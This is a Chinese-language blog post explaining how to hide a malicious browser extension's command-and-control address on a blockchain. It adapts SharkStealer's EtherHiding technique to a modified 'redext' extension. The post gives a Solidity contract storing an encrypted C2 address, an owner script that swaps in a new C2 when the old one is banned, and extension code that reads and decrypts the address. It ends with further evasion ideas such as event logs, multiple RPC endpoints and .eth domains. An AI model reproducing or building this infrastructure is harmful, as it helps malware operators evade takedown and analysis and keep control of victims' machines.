---
layout:     post                       
title:    使用Hardhat与eth_call实现动态配置c2
subtitle:   
date:       2025-11-15   
author:     Closure                         
header-img: img/fmqwq.jpg
catalog: true                         
tags:                               
    - 安全
---

### SharkStealer

[SharkStealer](https://cybersecuritynews.com/sharkstealer-using-etherhiding-pattern/ "SharkStealer")利用EtherHiding解析实际C2服务器地址的流程，完全绕过了传统的dns而是用区块链作为中间层。

恶意软件在电脑执行后，立刻建立与一个公共BSC Testnet RPC端点的连接，文章里分析确认的具体地址为data-seed-prebsc-2-s1.binance.org:8545，可见是一个合法的公共RPC服务器，然后构造并发送eth_call请求。

#### JSON-RPC请求示例

```
{
  "jsonrpc": "2.0",
  "method": "eth_call",
  "params": [
    {
      "to": "0x3dd7a9c28cfedf1c462581eb7150212bcf3f9edf",
      "data": "0x24c12bf6"
    },
    "latest"
  ]
}
```

这些被调用的智能合约充当了加密数据存储库的角色，收到上述eth_call查询时，被调用的函数会返回一个元tuple，其中包含一个IV和一个加密的payload。

恶意软件在获取到包含IV和加密payload的响应后，使用一个硬编码在二进制文件中的 AES-CFB密钥，结合之前从链上获取的 IV对payload进行本地解密，最终提取出实际的C2地址。

eth节点的交互一个是可见操作eth_sendTransaction，这个是改变区块链的状态且公开和需要gas以及永久的。一个是隐形eth_call，它是读取区块链的状态or模拟一次执行，这种交互是私有的 免费的且短暂的。

eth_call是一个RPC方法 ，在接收请求的单个节点的EVM内部执行智能合约代码，是一个本质上是一次模拟的只读操作，在eth_call执行过程中发生的任何状态变更都会在调用结束后立即被丢弃，区块链的实际状态永远不会被修改。

就是Solidity中的view和pure函数的工作原理 ，也是DApp界面用来Dry-run交易来估算Gas或者检测潜在回滚的机制 。

也就是eth_call**无广播、无Mempool、无矿工、无gas、同步返回**。

### 改redext硬编码c2

参考上述思路改一下之前写的扩展，因为原始项目的c2直接嵌在Python脚本里面，全部都是硬编码毫无抗分析可言（

需要构建一个自定义的Node服务器作为中间件来方便插件能够通信，然后再由服务器将请求转发给Hardhat节点。⬅️这种架构是是错误的。

因为*npx hardhat node*命令启动的进程本身就是功能完备的后端服务器，Hardhat节点暴露了JSON-RPC接口，这个接口专门设计用于被像ethers 小狐狸钱包这种Web3客户端直接使用的，所以*http.createServer*的相关信息在功能上冗余的。

做了四层:

- 后端，本地Hardhat节点
- 已部署到我们Hardhat节点的Solidity 合约
- 通信层是Ethers.js 库 ，用于在我们的插件中格式化和发送JSON-RPC请求到Hardhat节点。
- 前端，魔改之后的redext插件，在background.js服务工作线程中运行。

## Hardhat

用的2.0版本

![ ](/img/20251115-1.png)

合约

![ ](/img/20251115-2.png)

然后写个Ownable存储合约，三个private状态变量：storedUint、c2地址、owner。构造函数
在部署时运行constructor，将部署合约的钱包地址设置为owner变量 。

setC2Address是public的，用的onlyOwner修改器，只有我们才能成功调用它来设置c2地址。

```
pragma solidity ^0.8.0;

contract SimpleStorage {
    uint256 private storedUint;
    string private c2Address;
    address private owner;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner can call this function.");
        _;
    }

    function setUint(uint256 x) public {
        storedUint = x;
    }

    function getUint() public view returns (uint256) {
        return storedUint;
    }

    function setC2Address(string memory _str) public onlyOwner {
        c2Address = _str;
    }

    function getC2Address() public view returns (string memory) {
        return c2Address;
    }
}
```

### remix

![ ](/img/20251115-3.png)

链一下本地的

![ ](/img/20251115-4.jpg)
合约地址有了

Remix 作为JSON-RPC客户端，现在已经有了一个正在运行的节点和一个部署在上面的实时合约了

Hardhat项目目录打开一个新的终端窗口来安装 ethers 库，在项目根目录创建interact.js，搓了个简单逻辑的。

控制权在我代码里，const privateKey = "0xac09..."是唯一有权写入的人，只有拥有这个私钥的signer才能成功调用。
*const tx = awaitcontract.setC2Address(newC2Address);: * 当我的的旧C2被ban了之后运行这个脚本就可以传入一个新的。

```
const { ethers } = require("ethers");
const fs = require('fs');
const path = require('path');

const providerUrl = "http://127.0.0.1:8545";

const contractAddress = "0xd9145CCE52D386f254917e481eB44e9943F39138";

const privateKey = "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80";

const artifactPath = path.resolve(__dirname, 'artifacts/contracts/SimpleStorage.sol/SimpleStorage.json');
const artifact = JSON.parse(fs.readFileSync(artifactPath, 'utf8'));
const contractAbi = artifact.abi;

async function main() {
    const provider = new ethers.JsonRpcProvider(providerUrl);

    const signer = new ethers.Wallet(privateKey, provider);

    const contract = new ethers.Contract(contractAddress, contractAbi, signer);

    console.log("Connection successful!");
    console.log(`Contract Address: ${contract.target}`);
    console.log(`Signer Address: ${signer.address}`);
    console.log("------------------------------------");

    try {
        console.log("Reading initial C2 address...");
        const initialC2Address = await contract.getC2Address();
        console.log(`Initial C2 Address: "${initialC2Address}"`);
        console.log("------------------------------------");

        const newC2Address = "https://example.com/new-c2-path";
        console.log(`Setting new C2 address to: "${newC2Address}"...`);

        const tx = await contract.setC2Address(newC2Address);
        
        await tx.wait(); 
        
        console.log("Transaction confirmed!");
        console.log(`Transaction Hash: ${tx.hash}`);

        console.log("Reading updated C2 address");
        const updatedC2Address = await contract.getC2Address();
        console.log(`Updated C2 Address: "${updatedC2Address}"`);

    } catch (error) {
        console.error("Error interacting with contract:", error);
    }
}

main().catch(error => {
    console.error("Error executing script:", error);
    process.exit(1);
});
```

### 改原始扩展代码

接下来就是准备ethers.js并将保存到扩展的目录里面，然后在 manifest.json 中引用包含 ethers.min.js。

第二步是改background.js，因为我已经有了合约地址和 ABI。

#### ethers.js

![ ](/img/20251115-51.png)
从CDN下载的

#### interact.js

fetchC2ServerAddressFromChain()函数内部改成包含如下逻辑：

- 连接Provider: const provider = new ethers.JsonRpcProvider("http://127.0.0.1:8545/");
- 定义合约信息: const contractAddress = ""; const contractABI = [...];
- 创建合约实例: const contract = new ethers.Contract(contractAddress, contractABI, provider);
- 调用合约: const encryptedC2 = await contract.getC2Address();

现在的interact.js是我本地Mac终端中运行的管理脚本，目的是作为合约所有者来更新存储在区块链上的C2地址。

新增的简单加密逻辑用Node.js的AES-128-CBC算法来加密地址，然后将加密后的数据输出为Base64字符串。

主执行是用signer来实例化合约*new ethers.Contract(contractAddress, contractAbi, signer)*。因为signer被传入所以这个contract实例是可写的。

**加密**：const encryptedC2 = encrypt(plainTextC2);

**写入**：const tx = await contract.setC2Address(encryptedC2);`

创建一个交易，使用我之前写的privateKey发送到Hardhat 节点。

交易的内容是调用SimpleStorage合约的setC2Address函数，参数为加密后的Base64 字符串。

#### background.js

现在改为了在扩展时作为客户端去读取区块链上的C2地址，解密它，然后用它来初始化通信。

它定义了相同的RPC_URL和CONTRACT_ADDRESS。

Provider的创建：

```
const provider = new ethers.providers.JsonRpcProvider(RPC_URL);

const contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, provider);
```

这里只传入了provider，没有传入signer，所以这个contract 实例是只读的，只能调用合约上的view pure函数，不能发送交易 修改状态。

##### C2获取逻辑

读取*const encryptedC2 = await contract.getC2Address();*

这一行向Hardhat节点进行RPC调用，因为它是一个view函数，所以不消耗Gas并且是即返的。

### 本地测试

![ ](/img/20251115-5.png)

启动一下本地区块链 看到账户地址

然后将我们的SimpleStorage合约部署到刚刚启动的区块链上,运行npx hardhat ignition deploy ignition/modules/SimpleStorage.js --network localhost
![ ](/img/20251115-6.png)

如图 ，再复制这个新合约地址放进之前写的里面。
启动redext c2

回到终端运行node interact.js成功、

刷新扩展已经能看到成功读取了
![ ](/img/20251115-7.jpg)

虽然c2地址是加密的，但是高频率的eth_call 请求可能会成为一个行为指纹（

优化思路是用Events而不是现在的状态存储，改成调用一个函数来发出一个事件，并将加密的地址放在事件的数据中。植入体则不使用 eth_call轮询，换成订阅合约的事件日志。

现在其实还是依赖于一个硬编码的RPC URL和合约地址，如果RPC节点被ban就会失联。除了搞多点RPC列表，可以将合约地址注册到一个.eth域名下（?

